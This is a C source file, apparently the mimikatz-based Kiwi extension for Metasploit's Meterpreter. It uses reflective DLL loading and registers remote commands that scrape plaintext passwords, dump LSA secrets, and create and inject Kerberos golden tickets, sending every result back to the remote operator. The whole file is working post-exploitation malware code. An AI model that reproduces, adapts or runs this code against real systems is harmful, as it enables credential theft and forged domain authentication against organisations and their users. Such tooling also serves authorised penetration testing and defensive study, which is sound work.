/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/

#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
	// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
	// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
	// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

#include "main.h"
#include "mimikatz_interface.h"

DWORD request_scrape_passwords(Remote *remote, Packet *packet);
DWORD request_golden_ticket_create(Remote *remote, Packet *packet);
DWORD request_golden_ticket_use(Remote *remote, Packet *packet);
DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet);

Command customCommands[] =
{
    COMMAND_REQ("kiwi_scrape_passwords", request_scrape_passwords),
    COMMAND_REQ("kiwi_golden_ticket_use", request_golden_ticket_use),
    COMMAND_REQ("kiwi_golden_ticket_create", request_golden_ticket_create),
    COMMAND_REQ("kiwi_lsa_dump_secrets", request_lsa_dump_secrets),
    COMMAND_TERMINATOR
};

DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet)
{
	DWORD result;
	Packet * response = packet_create_response(packet);

	dprintf("[KIWI] Dumping LSA Secrets");

	result = mimikatz_lsa_dump_secrets(response);
	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

DWORD request_golden_ticket_use(Remote *remote, Packet *packet)
{
	Packet * response = packet_create_response(packet);
	DWORD result = ERROR_INVALID_PARAMETER;
	Tlv ticketTlv;

	result = packet_get_tlv(packet, TLV_TYPE_KIWI_GOLD_TICKET, &ticketTlv);

	if (result == ERROR_SUCCESS)
	{
		dprintf("[KIWI] Ticket size: %u bytes", ticketTlv.header.length);
		result = mimikatz_golden_ticket_use(ticketTlv.buffer, ticketTlv.header.length);
	}
	else
	{
		dprintf("[KIWI] Failed to get ticket content");
	}

	packet_transmit_response(result, remote, response);

	return result;
}

DWORD request_golden_ticket_create(Remote *remote, Packet *packet)
{
	DWORD result;
	Packet * response = packet_create_response(packet);
	char* user = packet_get_tlv_value_string(packet, TLV_TYPE_KIWI_GOLD_USER);
	char* domain = packet_get_tlv_value_string(packet, TLV_TYPE_KIWI_GOLD_DOMAIN);
	char* sid = packet_get_tlv_value_string(packet, TLV_TYPE_KIWI_GOLD_SID);
	char* tgt = packet_get_tlv_value_string(packet, TLV_TYPE_KIWI_GOLD_TGT);


	if (!user || !domain || !sid || !tgt)
	{
		result = ERROR_INVALID_PARAMETER;
	}
	else
	{
		result = mimikatz_golden_ticket_create(user, domain, sid, tgt, response);
	}

	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

DWORD request_scrape_passwords(Remote *remote, Packet *packet)
{
	DWORD result;
	Packet * response = packet_create_response(packet);
	UINT pwdId = packet_get_tlv_value_uint(packet, TLV_TYPE_KIWI_PWD_ID);

	dprintf("[KIWI] Pwd ID: %u", pwdId);

	result = mimikatz_scrape_passwords(pwdId, response);
	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

/*
 * Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	hMetSrv = remote->hMetSrv;

	dprintf("[KIWI] Init server extension - initorclean");
	mimikatz_initOrClean(TRUE);

	dprintf("[KIWI] Init server extension - register");
	command_register_all(customCommands);

	dprintf("[KIWI] Init server extension - done");

	return ERROR_SUCCESS;
}

/*
 * Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	mimikatz_initOrClean(FALSE);
	command_deregister_all(customCommands);

	return ERROR_SUCCESS;
}